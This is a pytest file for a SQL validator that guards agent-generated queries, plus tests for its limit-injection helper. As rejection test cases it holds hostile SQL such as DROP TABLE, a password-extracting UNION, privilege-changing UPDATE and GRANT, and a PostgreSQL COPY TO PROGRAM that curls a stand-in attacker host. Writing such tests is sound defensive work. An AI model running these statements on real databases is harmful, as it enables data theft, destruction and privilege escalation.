"""Unit tests for the shared SQL safety validator.

Covers the rules and the dialect-aware ``inject_limit`` helper.  The two
existing call sites (database connector + text_to_query agent node) have
their own test files; this file exercises the validator in isolation.
"""
from __future__ import annotations

import pytest

from src.services.db_safety.sql_validator import (
    ERROR_FORBIDDEN_KEYWORD,
    ERROR_FORBIDDEN_SET_OPERATOR,
    ERROR_MULTIPLE_STATEMENTS,
    ERROR_NOT_SELECT,
    ERROR_PARSE,
    SqlValidationResult,
    inject_limit,
    validate_sql,
)


# ---------------------------------------------------------------------------
# Happy paths
# ---------------------------------------------------------------------------


def test_simple_select_is_safe() -> None:
    result = validate_sql("SELECT id, name FROM users WHERE id = 1")
    assert result == SqlValidationResult(is_safe=True, reason=None, error_key=None)


def test_cte_ending_in_select_is_safe() -> None:
    sql = "WITH active AS (SELECT id FROM users WHERE active) SELECT * FROM active"
    result = validate_sql(sql)
    assert result.is_safe is True
    assert result.error_key is None


def test_nested_select_in_from_is_safe() -> None:
    sql = "SELECT id FROM (SELECT id FROM users WHERE active) AS sub"
    result = validate_sql(sql)
    assert result.is_safe is True


def test_select_with_aggregate_and_groupby_is_safe() -> None:
    sql = "SELECT user_id, COUNT(*) FROM orders GROUP BY user_id HAVING COUNT(*) > 5"
    result = validate_sql(sql)
    assert result.is_safe is True


def test_select_with_columns_named_like_keywords_is_safe() -> None:
    """The buggy regex impl rejected this on ``update_at``/``call``/``delete_at``."""
    sql = "SELECT id, update_at, delete_at, call FROM events WHERE update_at IS NOT NULL"
    result = validate_sql(sql)
    assert result.is_safe is True, f"false-positive resurrected: {result.reason!r}"


# ---------------------------------------------------------------------------
# Multi-statement
# ---------------------------------------------------------------------------


def test_multi_statement_is_rejected() -> None:
    result = validate_sql("SELECT 1; DROP TABLE users")
    assert result.is_safe is False
    # Either the multi-statement or the DROP fires first depending on parser
    # internals — both are "reject" outcomes for the same threat model.
    assert result.error_key in {ERROR_MULTIPLE_STATEMENTS, ERROR_FORBIDDEN_KEYWORD}


def test_trailing_semicolon_alone_is_safe() -> None:
    """One trailing semicolon should not be confused with multi-statement."""
    result = validate_sql("SELECT id FROM users;")
    assert result.is_safe is True


# ---------------------------------------------------------------------------
# UNION / set operators
# ---------------------------------------------------------------------------


def test_union_is_rejected() -> None:
    result = validate_sql("SELECT * FROM t UNION SELECT password FROM users")
    assert result.is_safe is False
    assert result.error_key == ERROR_FORBIDDEN_SET_OPERATOR


def test_intersect_is_rejected() -> None:
    result = validate_sql("SELECT id FROM t1 INTERSECT SELECT id FROM t2")
    assert result.is_safe is False
    assert result.error_key == ERROR_FORBIDDEN_SET_OPERATOR


def test_except_is_rejected() -> None:
    result = validate_sql("SELECT id FROM t1 EXCEPT SELECT id FROM t2")
    assert result.is_safe is False
    assert result.error_key == ERROR_FORBIDDEN_SET_OPERATOR


# ---------------------------------------------------------------------------
# Non-SELECT statements
# ---------------------------------------------------------------------------


def test_insert_is_rejected() -> None:
    result = validate_sql("INSERT INTO logs VALUES (1)")
    assert result.is_safe is False
    assert result.error_key in {ERROR_NOT_SELECT, ERROR_FORBIDDEN_KEYWORD}


def test_update_is_rejected() -> None:
    result = validate_sql("UPDATE users SET role='admin' WHERE id = 1")
    assert result.is_safe is False
    assert result.error_key in {ERROR_NOT_SELECT, ERROR_FORBIDDEN_KEYWORD}


def test_delete_is_rejected() -> None:
    result = validate_sql("DELETE FROM users WHERE id = 1")
    assert result.is_safe is False
    assert result.error_key in {ERROR_NOT_SELECT, ERROR_FORBIDDEN_KEYWORD}


def test_drop_is_rejected() -> None:
    result = validate_sql("DROP TABLE users")
    assert result.is_safe is False
    assert result.error_key in {ERROR_NOT_SELECT, ERROR_FORBIDDEN_KEYWORD}


# ---------------------------------------------------------------------------
# DML hidden inside a CTE
# ---------------------------------------------------------------------------


def test_dml_inside_cte_is_rejected() -> None:
    sql = "WITH cte AS (DELETE FROM t RETURNING *) SELECT * FROM cte"
    result = validate_sql(sql)
    assert result.is_safe is False
    assert result.error_key == ERROR_FORBIDDEN_KEYWORD


# ---------------------------------------------------------------------------
# Dialect-specific surfaces — EXEC (MSSQL) / COPY (PG) / CALL (PG)
# ---------------------------------------------------------------------------


def test_mssql_exec_is_rejected() -> None:
    result = validate_sql("EXEC sp_evil", dialect="tsql")
    assert result.is_safe is False
    assert result.error_key in {ERROR_NOT_SELECT, ERROR_FORBIDDEN_KEYWORD}


def test_postgres_copy_is_rejected() -> None:
    sql = "COPY users TO PROGRAM 'curl http://attacker.example/'"
    result = validate_sql(sql, dialect="postgres")
    assert result.is_safe is False
    assert result.error_key in {ERROR_NOT_SELECT, ERROR_FORBIDDEN_KEYWORD}


def test_call_procedure_is_rejected() -> None:
    result = validate_sql("CALL my_evil_proc(1)", dialect="postgres")
    assert result.is_safe is False
    assert result.error_key in {ERROR_NOT_SELECT, ERROR_FORBIDDEN_KEYWORD}


def test_truncate_is_rejected() -> None:
    result = validate_sql("TRUNCATE TABLE audit_log")
    assert result.is_safe is False
    assert result.error_key in {ERROR_NOT_SELECT, ERROR_FORBIDDEN_KEYWORD}


def test_grant_is_rejected() -> None:
    result = validate_sql("GRANT SELECT ON users TO PUBLIC")
    assert result.is_safe is False
    assert result.error_key in {ERROR_NOT_SELECT, ERROR_FORBIDDEN_KEYWORD}


# ---------------------------------------------------------------------------
# Garbage / parse errors
# ---------------------------------------------------------------------------


def test_garbage_returns_parse_error() -> None:
    result = validate_sql("this is not sql at all !@#$%^")
    assert result.is_safe is False
    assert result.error_key in {ERROR_PARSE, ERROR_NOT_SELECT, ERROR_FORBIDDEN_KEYWORD}


def test_empty_string_returns_parse_error() -> None:
    result = validate_sql("")
    assert result.is_safe is False
    assert result.error_key == ERROR_PARSE


def test_non_string_returns_parse_error() -> None:
    result = validate_sql(None)  # type: ignore[arg-type]
    assert result.is_safe is False
    assert result.error_key == ERROR_PARSE


# ---------------------------------------------------------------------------
# Dialect routing — MySQL ``LIMIT 100, 5`` (offset, count) syntax
# ---------------------------------------------------------------------------


def test_mysql_limit_offset_count_syntax_passes_under_mysql_dialect() -> None:
    """``LIMIT offset, count`` is MySQL-only — Postgres parser would reject it."""
    sql = "SELECT id FROM events ORDER BY id LIMIT 100, 5"
    assert validate_sql(sql, dialect="mysql").is_safe is True


# ---------------------------------------------------------------------------
# Reason text safety — never leaks the query
# ---------------------------------------------------------------------------


def test_reason_does_not_embed_query_text() -> None:
    secret = "SELECT secret_password_value_marker FROM very_secret_table"
    result = validate_sql(secret + "; DROP TABLE x")
    assert result.is_safe is False
    assert result.reason is not None
    assert "secret_password_value_marker" not in result.reason
    assert "very_secret_table" not in result.reason


# ===========================================================================
# inject_limit
# ===========================================================================


def test_inject_limit_appends_when_missing() -> None:
    out = inject_limit("SELECT id FROM users", n=100)
    assert "LIMIT" in out.upper()
    assert "100" in out


def test_inject_limit_replaces_larger_limit() -> None:
    out = inject_limit("SELECT id FROM users LIMIT 1000", n=100)
    upper = out.upper()
    assert "LIMIT" in upper
    assert "100" in out
    assert "1000" not in out


def test_inject_limit_leaves_smaller_limit_alone() -> None:
    out = inject_limit("SELECT id FROM users LIMIT 5", n=100)
    assert "5" in out
    assert "100" not in out


def test_inject_limit_is_idempotent_for_equal_limit() -> None:
    """``LIMIT 100`` with n=100 is the equal-case — leave it alone."""
    out = inject_limit("SELECT id FROM users LIMIT 100", n=100)
    upper = out.upper()
    assert upper.count("LIMIT") == 1
    assert "100" in out


def test_inject_limit_works_on_mssql_fetch_next() -> None:
    """MSSQL uses OFFSET/FETCH NEXT — the new injector handles that
    correctly; the old subquery-wrapping helper would have produced
    invalid syntax on T-SQL."""
    sql = (
        "SELECT id FROM events ORDER BY id "
        "OFFSET 0 ROWS FETCH NEXT 1000 ROWS ONLY"
    )
    out = inject_limit(sql, n=100, dialect="tsql")
    upper = out.upper()
    # On T-SQL, sqlglot may render either as ``LIMIT 100`` or ``FETCH NEXT
    # 100 ROWS ONLY``.  Either is correct semantically — what matters is
    # that the larger 1000 is gone and 100 is present somewhere.
    assert "100" in out
    assert "1000" not in out
    assert upper.count("LIMIT") + upper.count("FETCH NEXT") >= 1


def test_inject_limit_rejects_non_positive() -> None:
    with pytest.raises(ValueError):
        inject_limit("SELECT id FROM t", n=0)
    with pytest.raises(ValueError):
        inject_limit("SELECT id FROM t", n=-1)


def test_inject_limit_raises_on_unparseable() -> None:
    with pytest.raises(ValueError):
        inject_limit("not sql !!!", n=100)
